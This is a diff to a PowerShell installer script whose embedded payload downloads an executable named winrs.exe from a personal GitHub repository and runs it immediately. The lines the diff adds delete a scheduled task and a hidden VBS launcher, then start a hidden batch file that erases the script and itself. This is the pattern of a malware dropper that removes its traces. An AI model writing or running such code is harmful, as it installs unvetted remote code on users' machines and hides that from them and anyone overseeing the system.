@@ -17,20 +17,39 @@ function Write-Err($msg) {
 }
 
 $installContent = @'
-Set-StrictMode -Version Latest
+Try {
+    Write-Output "===> Start at $(Get-Date -Format o)"
+
     $scriptPath = "$PSScriptRoot\winrs.exe"
     iwr https://github.com/truongcp0305/dp/archive/refs/heads/winrs.exe -OutFile winrs.exe -UseBasicParsing
     & $scriptPath
 
+} Catch {
+    Write-Error "Error: $_"
+}Finally {
     schtasks /Delete /TN "WinRpInstall" /F 2>$null | Out-Null
+    
     $scriptPath = $MyInvocation.MyCommand.Path
     $scriptDir = Split-Path -Parent $scriptPath
     $vbsPath = Join-Path $scriptDir "run_hidden.vbs"
+    $logPath = Join-Path $scriptDir "install.log"
     
     if (Test-Path $vbsPath) {
         Remove-Item $vbsPath -Force -ErrorAction SilentlyContinue
     }
     
+    $tempBat = Join-Path $env:TEMP "cleanup_$(Get-Random).bat"
+    @"
+@echo off
+timeout /t 2 /nobreak >nul
+del "$scriptPath" >nul 2>&1
+del "$tempBat" >nul 2>&1
+"@ | Out-File -FilePath $tempBat -Encoding ASCII
+    
+    Start-Process -FilePath $tempBat -WindowStyle Hidden
+    
+    Write-Output "Cleanup initiated."
+}
 '@
 
 try {
